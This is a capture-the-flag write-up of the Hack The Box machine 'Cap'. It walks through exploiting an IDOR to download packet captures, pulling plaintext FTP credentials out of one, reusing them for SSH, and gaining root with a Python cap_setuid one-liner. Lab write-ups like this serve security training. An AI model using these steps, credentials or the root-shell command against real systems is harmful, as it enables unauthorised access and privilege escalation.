# Cap Write-up

**Machine:** Cap
**Difficulty:** Easy
**OS:** Linux
**Goal:** Get the user flag, then escalate privileges and get the root flag.

---

## 1. Connect to the HTB VPN
First, I downloaded the HTB `.ovpn` configuration file and connected to the VPN:

```bash
sudo openvpn machines_eu-3.ovpn
```
I knew the VPN was successfully connected when I saw:

```
Initialization Sequence Completed
```
and a `tun0` interface appeared with an HTB IP:

```
10.10.15.23
```
This VPN is necessary because the HTB machine isn't directly accessible from the normal internet.

---

# Task 1 — Find the open TCP ports
The target machine was:

```
10.129.81.72
```
I scanned all TCP ports:

```bash
nmap -sT -p- 10.129.81.72
```

### Why?
Before attacking a machine, we need to know **what services are running**.
Ports tell us which services might be available.
For example:

```
22  → SSH
21  → FTP
80  → HTTP
```
The scan gave us the services we needed to investigate.

---

# Task 2 — Understand the Security Snapshot path
The machine had a web application on port 80.
I opened:

```
http://10.129.81.72
```
There was a feature called:

```
Security Snapshot (5 Second PCAP + Analysis)
```
When I used it, the application redirected me to a URL like:

```
/data/3
```
The task asked what the `/[something]/[id]` part was.
The answer was:

```
data
```

### Why did we investigate this?
The application was taking a network snapshot and then displaying the result using a predictable URL.
This was important because the scan ID was directly present in the URL:

```
/data/1
/data/2
/data/3
```
That gives us a way to investigate different captured scans.

---

# Task 3 — Access another user's scan
The next task asked whether we could access another user's scan.
The important idea here was **access control**.
Normally, if I'm logged in as one user, I shouldn't be able to simply change:

```
/data/1
```
to:

```
/data/2
```
and see somebody else's information.
This type of issue is commonly called **IDOR / broken access control** when changing an object identifier allows access to another user's object.
In our investigation, we found Nathan's data.
The important lesson was:

> Never assume that changing an ID is safe just because the application doesn't show an obvious error.

---

# Task 4 — Find the PCAP containing sensitive data
The Security Snapshot feature created PCAP files.
A PCAP is basically a **recording of network packets**.
I checked the downloadable captures:

```
/download/1
/download/2
/download/3
/download/4
```
Initially, I checked IDs 1–4.
PCAP 3 contained normal HTTP traffic such as:

```
GET /capture HTTP/1.1
```
PCAP 4 contained a redirect to:

```
/data/3
```
Neither contained the sensitive information we were looking for.
Then I checked **PCAP 0**:

```bash
curl -o 0.pcap http://10.129.81.72/download/0
```
and inspected it:

```bash
strings 0.pcap
```
This revealed:

```
220 (vsFTPd 3.0.3)
USER nathan
331 Please specify the password.
PASS Buck3tH4TF0RM3!
230 Login successful.
```

### This was the important discovery.
We found:

```
Username: nathan
Password: Buck3tH4TF0RM3!
```
The password was transmitted through the network in plaintext.
Therefore, the PCAP containing the sensitive data was:

```
0
```

---

# Task 5 — Which application-layer protocol contains the sensitive data?
From the PCAP we saw:

```
220 (vsFTPd 3.0.3)
USER nathan
PASS Buck3tH4TF0RM3!
```
`vsFTPd` is an FTP server.
Therefore, the application-layer protocol carrying the sensitive information was:

```
FTP
```

### Why is this dangerous?
Normal FTP does **not encrypt the login credentials**.
So if someone captures the network traffic, they can see:

```
USER nathan
PASS Buck3tH4TF0RM3!
```
This is a classic example of why encrypted protocols such as SSH/SFTP should be preferred over plaintext FTP.

---

# Task 6 — Password reuse
Now we had Nathan's FTP credentials:

```
nathan
Buck3tH4TF0RM3!
```
The task asked:

> On what other service does this password work?
We tested the other exposed services.
The same credentials worked for **SSH**.
We could therefore connect with:

```bash
ssh nathan@10.129.81.72
```
and enter:

```
Buck3tH4TF0RM3!
```

### Why did this work?
Because the password was **reused across services**.
The attack chain was:

```
PCAP
 ->
FTP credentials exposed
 ->
nathan password recovered
 ->
Same password used for SSH
 ->
SSH access as nathan
```
This is a very common real-world security problem.
If an attacker gets a password from one service, they will often try the same credentials against other services.

---

# User Flag
Once logged in through SSH:

```bash
ssh nathan@10.129.81.72
```
I checked who I was:

```bash
whoami
```
which returned:

```
nathan
```
Then I checked the home directory:

```bash
ls -la
```
and found the user flag.
I read it with:

```bash
cat user.txt
```
That gave us the **User Flag**.

---

# Privilege Escalation
Now we were `nathan`, but we weren't root.
So the next objective was:

> Find something that allows a normal user to execute something with elevated privileges.
A useful Linux privilege-escalation check is:

```bash
getcap -r / 2>/dev/null
```
This searches for files with **Linux capabilities**.
We found:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```
The interesting one was:

```
/usr/bin/python3.8
```
because it had:

```
cap_setuid
```

---

# Task 8 — Find the binary with special capabilities
The task asked:

> What is the full path to the binary that has special capabilities which can be abused to obtain root privileges?
The answer was:

```
/usr/bin/python3.8
```

### Why is `cap_setuid` important?
Linux UID `0` represents **root**.
`cap_setuid` allows a process to change its user ID.
Python had this capability, meaning we could use Python to change the process UID to `0`.
This turned a normal `nathan` shell into a root shell.

---

# Root Privilege Escalation
We used Python:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
Then checked:

```bash
whoami
```
and got:

```
root
```
So we successfully escalated:

```
nathan
  ->
Python with cap_setuid
  ->
UID 0
  ->
root
```

---

# Root Flag
Finally, since we were root:

```bash
cat /root/root.txt
```
This displayed the **Root Flag**.

---

# Complete Attack Chain
The entire machine can be remembered as:

```
                 CAP
                  │
                  ▼
          Scan open services
                  │
                  ▼
             Web Server
                  │
                  ▼
        Security Snapshot
                  │
                  ▼
              PCAP files
                  │
                  ▼
         Find sensitive PCAP
                  │
                  ▼
          PCAP 0 contains
        FTP credentials
                  │
                  ▼
       nathan : password
                  │
                  ▼
       Password reused on SSH
                  │
                  ▼
          SSH as nathan
                  │
                  ▼
             User Flag
                  │
                  ▼
       getcap -r / 2>/dev/null
                  │
                  ▼
       /usr/bin/python3.8
          cap_setuid
                  │
                  ▼
        Change UID to 0
                  │
                  ▼
               ROOT
                  │
                  ▼
             Root Flag
```

## The main things to remember from Cap
1. **Enumerate first** — find the services before attacking.
1. **Look at application functionality**, not just ports.
1. **PCAP files can expose sensitive information** if traffic isn't encrypted.
1. **FTP sends credentials in plaintext.**
1. **Never assume passwords are unique to one service** — test for password reuse.
1. **For Linux privilege escalation, check capabilities** with:

```bash
getcap -r / 2>/dev/null
```
1. `cap_setuid` on an executable like Python is extremely dangerous because it can allow the process to become UID `0`.
That's the actual logic of the machine—not just a sequence of commands to memorize.
